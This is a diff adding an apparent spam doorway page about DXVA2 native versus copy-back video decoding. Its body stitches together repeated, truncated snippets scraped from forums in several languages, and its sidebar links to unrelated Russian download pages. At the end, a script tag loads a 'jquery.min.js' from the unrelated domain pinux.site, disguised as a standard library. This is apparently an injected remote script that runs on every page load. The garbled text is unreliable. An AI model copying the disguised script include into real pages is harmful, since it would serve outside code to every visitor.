@@ -1,0 +1,153 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Dxva2 native copy back - geusohchi.woodland-energy.com</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">geusohchi.woodland-energy.com</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Dxva2 native copy back</h2>
+                            </header>
+                            <p>DXVA2 native - декодированное изображение остается в памяти видеокарты вплоть до его вывода (визуализации). DirectX Video Acceleration  DXVA2 implementations: native and copy-back. DXVA2 implementations come in two variants: native and copy-back. With native implementation, the decoded video stays in GPU memory until it has been displayed. 
+MPC-HC (https://mpc-hc.org) lists these as the hardware acceleration modes. Which one should you use if you own a Nvidia card and use Windows. DXVA2 native - декодированное изображение остается в памяти видеокарты вплоть  DXVA2 copy-back копирует декодированное с помощью GPU видеокарты изображение в обычную. DXVA2 native; DXVA2 copy-back; NVIDIA CUVID;  Используйте DXVA2 copy-back, если вам нужно сделать обработку видео после декодирования. Используйте DXVA2 native при использовании Media Player Classic. hi. when it comes to hardware accelerated html5 avc does google chrome use dxva2 native or dxva2 copy-back ? or is both possible ? if so is there a way to influence that behaviour. DXVA2 (copy-back): Can be used by any hardware that supports DXVA2 (Intel might have some issues with VC1 video). Uses more GPU / memory bandwidth since every video texture is copied back to main RAM after decoding (hence the copy-back in name). DXVA2 (native):. DVXA Copy back or Native What is the difference? Some details please My system specs: Lenovo IdeaPad Y570-2349 • Intel Core i7 2670QM dxva2 copy back vs native 話題討論、資訊整理文章， DXVA2 (copy-back)：為微軟開發的硬體加速介面，ANI顯示卡均可使用，會將解碼完成的.,軟體教學,軟體下載,軟體社群,Windows軟體,Mac軟體. DXVA2(copy-back)在解码低帧率高码率的视频时与DXVA2(native)基本持平；但解码高帧率低码率视频时速度远不及DXVA2(native)，而且也比VP5的DXVA2(native). 
+Our decoding and rendering benchmarks consists of standardized test  we used the DXVA2 mode provided by the LAV Video Decoder. In addition to DXVA2 Native, we also used the QuickSync decoder developed by Eric  The second option is to use either QuickSync or DXVA2 Copy-Back. H.264 DXVA Benchmarks: QuickSync vs UVD 2.2 vs VP4 vs VP5 Software players  LAV Video 0.47 (in all modes - DXVA2 native, DXVA2 copy-back, NVCUVID, QS) MS DS/MFT  The performance of LAV DXVA2 copy-back is simply awful. 「DXVA2 (native)」を利用する場合、ビデオレンダラは「EVR」でなくてはならないので注意。 （他のレンダラを使いたい時は、「DXVA2 (copy-back). 
+This is the step how to re-produced the issue : 1.In MPC-HC 64bit, enable LAV0.68.1 + DXVA2. Skip navigation. Home; Communities Support Forums; Log in; Register; Search  DXVA2 Copy-Back mode freezes issue on RX460. Question asked by vonchen on Oct 26,  Also DXVA2 Native mode has no issue. DXVA2(native) (纯dxva，以上都不支持则推荐native) DXVA2(copy-back) (dxva无渲染) 选中后，会在右边提示是否可用（Available表示可用，not available. MPC-HC Video Decoder Comparison. From wiki.mikejung.biz. Jump to: navigation, search.  As you can see here, if you compare DXVA2 versus CUVID,  with the default video renderer and video decoder. By default MPC-HC uses the DXVA(native) decoder if it detects hardware that supports. LAV Video Decoder 옵션에서 하드웨어 가속 부분은 DXVA2 copy-back 방식으로 설정하였습니다. 문제는 일부 블루레이 원본 동영상  copy-back, native 골라먹는 재미가 있어도 amd에서는 적어도 7000번대 이상급이어야. DXVA ( native ) 가 적용되지 않는 경우가 있었다 ★★★★★ 임시로 copy-back 을 사용하면 된다. Hi, I'm facing a trouble with enabling DXVA2 support in LAV video decoder. I have updated AMD crimson drivers to the latest version available but still the DXVA2(both "native" and "copy-back") options of the LAV video decoder doesn't show my AMD Radeon HD8750M. Using hardware acceleration with decoder DXVA2 (native or copy-back) I see corrupted HD video playback after 2-3 mins. The same result is with latest stable or latest nightly version. 关于DXVA nat.DXVA2 implementations come in two variants: native and copy-back.With the native implementation 
+dxva2:明明白白gpu硬解高清,也不知道到底算不算原创，这些是俺1月12日整理了很多资料放在博客上的，后来看见几次有人问硬解的问题，想想还是干脆贴给大家方便吧。（blog里面还有"精研事务所"网 ,电脑讨论,讨论区. CUVID does indeed use more power than DXVA but it's also more flexible. Native DXVA2 is restricted in terms of what files are compatible. Copy-Back DXVA2 (as Nev calls it) doesn't have this restriction LAV Filters changelog.  Fixed: HDR metadata was not properly communicated to madVR in DXVA2-Native mode; Fixed:  Faster: DXVA2 Copy-Back in direct output mode uses up to 50% less CPU and performance is improved accordingly; Fixed:. Der LAV-Decoder unterstützt mittlerweile DXVA2 native (ab Win vista) und DXVA copy back! Meine ersten Tests mit Version 0.48 waren sehr positiv: . Nvidia: Cuda / DXVA2 AMD: DXVA2 / DXVA copy back Rest: DXVA2 / software Geändert Thanks. I've now tested that and it makes no difference. I tried all the options: DXVA2 copy-back DXVA2 native (what it was set at) intel quicksync. Describe the issue you're having: When the playing starts, the rendered video flashes black images with actual video images, fast and continuously. It doesn't ever recover. How can the issue be reproduced? Sample File? Play the attached. 
+I 've discovered that this apparently is a Problem with the native DXVA2 setting. . (in the LAV settings) to DXVA2 (copy-back) and the problem is solved. Unfortunately, there seems to be no way to adjust this option when Kodi. Is there any possibility to set the Kodi to . DXVA2 Fastest Option: -- DXVA2; MadVR Image Downscaling. For most people,  These tests include DXVA2 Native, DXVA2 Copy Back, CUVID, and software.  but then again I was only testing a 720p video. As you can see, DXVA2 Copy Back had the highest usage here, with DXVA2 Native and CUDA in second. DXVA2 native – декодированное изображение остается в памяти видеокарты вплоть до его вывода (визуализации). DirectX Video Acceleration  DXVA2 implementations: native and copy-back. DXVA2 implementations come in two variants: native and copy-back. With native implementation, the decoded video stays in GPU memory until it has been displayed. DXVA2 native – декодированное изображение остается в памяти видеокарты вплоть  DXVA2 copy-back копирует декодированное с помощью GPU видеокарты изображение в обычную. DXVA2 native; DXVA2 copy-back; NVIDIA CUVID;  Используйте DXVA2 copy-back, если вам нужно сделать обработку видео после декодирования. Используйте DXVA2 native при использовании Media Player Classic. hi. when it comes to hardware accelerated html5 avc does google chrome use dxva2 native or dxva2 copy-back ? or is both possible ? if so is there a way to influence that behaviour. 
+DXVA2 (copy-back): Can be used by any hardware that supports DXVA2 (Intel might have some issues with VC1 video). Uses more GPU / memory bandwidth since every video texture is copied back to main RAM after decoding (hence the copy-back in name). DXVA2 (native):. DVXA Copy back or Native What is the difference? Some details please My system specs: Lenovo IdeaPad Y570-2349 • Intel Core i7 2670QM dxva2 copy back vs native 話題討論、資訊整理文章， DXVA2 (copy-back)：為微軟開發的硬體加速介面，ANI顯示卡均可使用，會將解碼完成的.,軟體教學,軟體下載,軟體社群,Windows軟體,Mac軟體. DXVA2(copy-back)在解码低帧率高码率的视频时与DXVA2(native)基本持平；但解码高帧率低码率视频时速度远不及DXVA2(native)，而且也比VP5的DXVA2(native). Our decoding and rendering benchmarks consists of standardized test  we used the DXVA2 mode provided by the LAV Video Decoder. In addition to DXVA2 Native, we also used the QuickSync decoder developed by Eric  The second option is to use either QuickSync or DXVA2 Copy-Back. H.264 DXVA Benchmarks: QuickSync vs UVD 2.2 vs VP4 vs VP5 Software players  LAV Video 0.47 (in all modes - DXVA2 native, DXVA2 copy-back, NVCUVID, QS) MS DS/MFT  The performance of LAV DXVA2 copy-back is simply awful. 
+「DXVA2 (native)」を利用する場合、ビデオレンダラは「EVR」でなくてはならないので注意。 （他のレンダラを使いたい時は、「DXVA2 (copy-back). This is the step how to re-produced the issue : 1.In MPC-HC 64bit, enable LAV0.68.1 + DXVA2. Skip navigation. Home; Communities Support Forums; Log in; Register; Search  DXVA2 Copy-Back mode freezes issue on RX460. Question asked by vonchen on Oct 26,  Also DXVA2 Native. DXVA2(native) (纯dxva，以上都不支持则推荐native) DXVA2(copy-back) (dxva无渲染) 选中后，会在右边提示是否可用（Available表示可用，not available. MPC-HC Video Decoder Comparison. From wiki.mikejung.biz. Jump to: navigation, search.  As you can see here, if you compare DXVA2 versus CUVID,  with the default video renderer and video decoder. By default MPC-HC uses the DXVA(native) decoder if it detects hardware that supports. 
+LAV Video Decoder 옵션에서 하드웨어 가속 부분은 DXVA2 copy-back 방식으로 설정하였습니다. 문제는 일부 블루레이 원본 동영상  copy-back, native 골라먹는 재미가 있어도 amd에서는 적어도 7000번대 이상급이어야. DXVA ( native ) 가 적용되지 않는 경우가 있었다 ★★★★★ 임시로 copy-back 을 사용하면 된다. Hi, I'm facing a trouble with enabling DXVA2 support in LAV video decoder. I have updated AMD crimson drivers to the latest version available but still the DXVA2(both native and copy-back ) options of the LAV video decoder doesn't show my AMD Radeon HD8750M. Using hardware acceleration with decoder DXVA2 (native or copy-back) I see corrupted HD video playback after 2-3 mins. The same result is with latest stable or latest nightly version. 关于DXVA nat.DXVA2 implementations come in two variants: native and copy-back.With the native implementation 
+dxva2:明明白白gpu硬解高清,也不知道到底算不算原创，这些是俺1月12日整理了很多资料放在博客上的，后来看见几次有人问硬解的问题，想想还是干脆贴给大家方便吧。（blog里面还有“精研事务所”网 ,电脑讨论,讨论区. CUVID does indeed use more power than DXVA but it's also more flexible. Native DXVA2 is restricted in terms of what files are compatible. Copy-Back DXVA2 (as Nev calls it) doesn't have this restriction LAV Filters changelog.  Fixed: HDR metadata was not properly communicated to madVR in DXVA2-Native mode; Fixed:  Faster: DXVA2 Copy-Back in direct output mode uses up to 50% less CPU and performance is improved accordingly; Fixed:. Der LAV-Decoder unterst tzt mittlerweile DXVA2 native (ab Win vista) und DXVA copy back! Meine ersten Tests mit Version 0.48 waren sehr positiv: . Nvidia: Cuda / DXVA2 AMD: DXVA2 / DXVA copy back Rest: DXVA2 / software Ge ndert Thanks. I've now tested that and it makes no difference. I tried all the options: DXVA2 copy-back DXVA2 native (what it was set at) intel quicksync. I 've discovered that this apparently is a Problem with the native DXVA2 setting. . (in the LAV settings) to DXVA2 (copy-back) and the problem is solved. Unfortunately, there seems to be no way to adjust this option when Kodi. Is there any possibility to set the Kodi to . DXVA2 Fastest Option: -- DXVA2; MadVR Image Downscaling. For most people,  These tests include DXVA2 Native, DXVA2 Copy Back, CUVID, and software.  but then again I was only testing a 720p video. As you can see, DXVA2 Copy Back had the highest usage here, with DXVA2 Native. 
+</p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="o2ae-semya-skachat-kartinki.html">Семья скачать картинки</a></li>
+                                <li><a href="o2ae-shpargalka-po-semeynomu-konsultirovaniyu.html">Шпаргалка по семейному консультированию</a></li>
+                                <li><a href="o2ae-glaz-tv-onlayn-pryamaya-translyaciya.html">Глаз тв онлайн прямая трансляция</a></li>
+                                <li><a href="o2ae-elektronnyy-zhurnal-shkoly-1158.html">Электронный журнал школы 1158</a></li>
+                                <li><a href="o2ae-skachat-s-novym-godom-pozdravleniya-kartinki.html">Скачать с новым годом поздравления картинки</a></li>
+                                <li><a href="o2ae-skachat-hroniki-beyna-fb2.html">Скачать хроники бейна fb2</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"><li>Что лучше использовать DXVA native или DXVA copy-back.</li>
+<li>Плавное воспроизведение видео на компьютере - Часть</li>
+<li>Аппаратное ускорение в настройках кодеков для видео.</li>
+</ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="o2ae-prezentaciya-interesnaya-fizika.html">Презентация интересная физика</a></li>
+                                            <li><a href="o2ae-blank-schet-faktura-invoys-skachat.html">Бланк счет фактура инвойс скачать</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="o2ae-kish-hristova-nevesta-akkordy.html">Киш христова невеста аккорды</a></li>
+                                            <li><a href="o2ae-dok-filmy-o-prirode-torrent.html">Док фильмы о природе торрент</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="o2ae-skachat-knigi-patanatomiya.html">Скачать книги патанатомия</a></li>
+                                            <li><a href="o2ae-kseniya-sitnik-prostaya-pesenka-minus-skachat-besplatno.html">Ксения ситник простая песенка минус скачать бесплатно</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="o2ae-poliklinika-3-syktyvkar-oficialnyy-sayt-raspisanie.html">Поликлиника 3 сыктывкар официальный сайт расписание</a></li>
+                                            <li><a href="o2ae-skachat-pesnyu-orientaciya.html">Скачать песню ориентация</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
